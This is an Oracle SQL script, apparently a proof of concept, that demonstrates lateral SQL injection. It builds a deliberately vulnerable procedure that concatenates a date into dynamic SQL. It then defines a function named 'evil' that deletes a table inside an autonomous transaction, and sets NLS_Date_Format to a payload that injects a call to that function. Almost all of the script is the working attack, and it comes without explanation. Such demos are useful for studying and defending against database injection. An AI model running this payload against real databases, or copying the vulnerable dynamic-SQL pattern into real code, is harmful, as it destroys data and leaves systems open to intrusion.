conn hr/hr

set serveroutput on

DROP TABLE temp
/
CREATE TABLE temp(id number, d1 date)
/
alter session set NLS_Date_Format = 'yyyy-mm-dd hh24:mi:ss'
/
BEGIN
	insert into temp(id, d1) values(1, '2009-02-03 17:30:00');
	commit;
END;
/
CREATE OR REPLACE PROCEDURE vuln_date is
	TYPE NumList IS TABLE OF NUMBER;
	result NumList;
	q constant varchar2(1) := '''';
	d constant date := To_Date('2009-02-02 17:30:00','yyyy-mm-dd hh24:mi:ss');
	Stmt constant varchar2(32767) := 'select temp.id from temp 
					where temp.d1 > ' || q||d||q;
BEGIN
	execute immediate Stmt;
	dbms_output.put_line(stmt);	
END vuln_date;
/

alter session set NLS_Date_Format = 'dd-Mon-yy hh24:mi:ss'
/
begin vuln_date(); end;
/
DROP TABLE important_table
/
CREATE TABLE important_table
	AS SELECT * FROM employees
/

SELECT COUNT(*) FROM important_table;
CREATE OR REPLACE FUNCTION evil
RETURN NUMBER
AS
	PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
  EXECUTE IMMEDIATE 'delete important_table';
  COMMIT;
RETURN 1;
END;
/
alter session set NLS_Date_Format = '"'' and hr.Evil()=1--"'
/
begin vuln_date(); end;
/
SELECT * FROM important_table;



